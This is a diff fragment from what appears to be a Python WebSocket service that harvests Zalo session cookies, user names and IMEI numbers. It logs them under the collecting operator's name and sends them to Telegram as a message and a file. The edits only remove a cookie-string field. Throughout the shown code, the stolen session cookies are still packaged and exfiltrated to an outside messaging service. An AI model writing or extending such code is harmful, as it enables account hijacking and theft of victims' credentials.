@@ -434,19 +434,17 @@ async def ws_endpoint(ws: WebSocket, session_id: str):
         cookies    = result["cookies"]
         user       = result["user_info"]
         imei       = result["imei"]
-        cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())
         now        = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
 
         name = user.get("displayName", "N/A") or "N/A"
 
         record = {
-            "id":         session_id[:8],
-            "owner":      username,
-            "name":       name,
-            "imei":       imei,
-            "cookie_str": cookie_str,
-            "cookies":    cookies,
-            "time":       now,
+            "id":      session_id[:8],
+            "owner":   username,
+            "name":    name,
+            "imei":    imei,
+            "cookies": cookies,
+            "time":    now,
         }
         add_history(record)
 
@@ -456,7 +454,6 @@ async def ws_endpoint(ws: WebSocket, session_id: str):
             f"=== ZALO COOKIE ===\n"
             f"Tên: {name}\nIMEI: {imei}\n"
             f"Thời gian: {now}\nLấy bởi: {username}\n\n"
-            f"--- COOKIE STRING ---\n{cookie_str}\n\n"
             f"--- COOKIE JSON ---\n{json.dumps(cookies, ensure_ascii=False, indent=2)}\n"
         )
 
@@ -464,8 +461,7 @@ async def ws_endpoint(ws: WebSocket, session_id: str):
             f"🍪 <b>ZALO COOKIE MỚI</b>\n\n"
             f"👤 Tên: <b>{name}</b>\n"
             f"📡 IMEI: <code>{imei}</code>\n"
-            f"🕐 Thời gian: {now}\n👨‍💻 Lấy bởi: <code>{username}</code>\n\n"
-            f"<b>Cookie String:</b>\n<code>{cookie_str[:500]}{'...' if len(cookie_str)>500 else ''}</code>"
+            f"🕐 Thời gian: {now}\n👨‍💻 Lấy bởi: <code>{username}</code>"
         )
         asyncio.create_task(send_telegram(tg_text))
         asyncio.create_task(send_telegram_file(
